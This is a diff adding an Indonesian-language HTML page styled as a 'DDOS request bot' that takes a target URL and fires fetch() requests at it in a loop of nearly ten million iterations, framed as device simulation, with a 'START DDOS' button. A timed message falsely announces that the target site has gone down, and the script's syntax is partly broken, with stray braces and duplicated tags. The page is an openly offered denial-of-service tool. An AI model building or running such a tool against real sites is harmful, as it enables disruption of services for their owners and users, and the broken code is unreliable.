@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDOS BY XRANS</title>
+</head>
+<body>
+    <style>
+        #urlInput {
+            font-size: 16px;
+            padding: 10px;
+            width: 300px;
+        }
+
+        .invalid-url {
+            color: red;
+        }
+    </style>
+    
+    <style>
+        button {
+            background-color: lightgreen;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        
+        button:hover {
+            background-color: limegreen;
+        }
+    </style>
+
+    <style>
+        button {
+            display: block;
+            margin-bottom: 10px; /* Jarak antar tombol */
+            width: 100%; /* Tombol mengisi lebar container */
+            padding: 10px;
+            font-size: 16px;
+        }
+    </style>
+     
+    <style>
+        body {
+            background-color: #121212; 
+            color: #ffffff; /* Warna teks putih */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #075E54; 
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+        }
+        .content {
+            padding: 20px;
+        }
+        .card {
+            background-color: #202C33;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        a {
+            color: #25D366; 
+            text-decoration: none;
+        }
+    </style>
+    
+    <h1>𝙳𝙳𝙾𝚂 𝚁𝙴𝚀𝚄𝙴𝚂𝚃 𝙱𝙾𝚃 ©𝚇𝚁𝙰𝙽𝚂</h1>
+  <div id="status">𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐓𝐀𝐑𝐆𝐄𝐓 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 𝐍𝐎𝐑𝐌𝐀𝐋</div>
+
+  <script>
+    // Fungsi untuk membuat permintaan ke URL yang ditentukan
+    function requestDeviceSimulation(deviceId, url) {
+      fetch(url)
+        .then(response => response.text())
+        .then(data => {
+          console.log(`Device ${deviceId}: Response received`);
+        })
+        .catch(error => {
+          console.error(`Device ${deviceId}: Error occurred`, error);
+        });
+    }
+
+    // Fungsi untuk mulai simulasi setelah input URL
+    function startSimulation() {
+      const url = document.getElementById('urlInput').value; // Ambil URL dari input
+
+      if (url) {
+        for (let i = 5; i <= 9999999; i++) {
+          requestDeviceSimulation(i, url);
+        }
+      } else {
+        alert('𝙼𝙰𝚂𝚄𝙺𝙸𝙽 𝚄𝚁𝙻 𝙻𝙸𝙽𝙺 𝚈𝙶 𝙱𝙴𝙽𝙰𝚁 𝙱𝙴𝙶𝙾𝙾');
+      }
+    }
+    setTimeout(() => {
+                updateStatus("𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 𝐂𝐔𝐘");
+            }, 2000); // Setelah 2 detik
+        }
+
+        // Fungsi untuk memperbarui status
+        function updateStatus(status) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'Status: ' + status;
+  </script>
+</head>
+<body>
+  
+  <label for="urlInput">𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝚃𝙰𝚁𝙶𝙴𝚃 𝚄𝚁𝙻:</label>
+  <input type="text" id="urlInput" placeholder="https://contoh.com" style="color: red; background-color: white;" />
+  <p id="status">𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙸 𝙳𝙰𝙻𝙰𝙼 𝚄𝙹𝙸 𝙲𝙾𝙱𝙰 𝙲𝚄𝚈 🙏</p>
+  <button onclick="startSimulation()">𝚂𝚃𝙰𝚁𝚃 𝙳𝙳𝙾𝚂 𝙲𝙸𝙺</button>
+</body>
+</html>
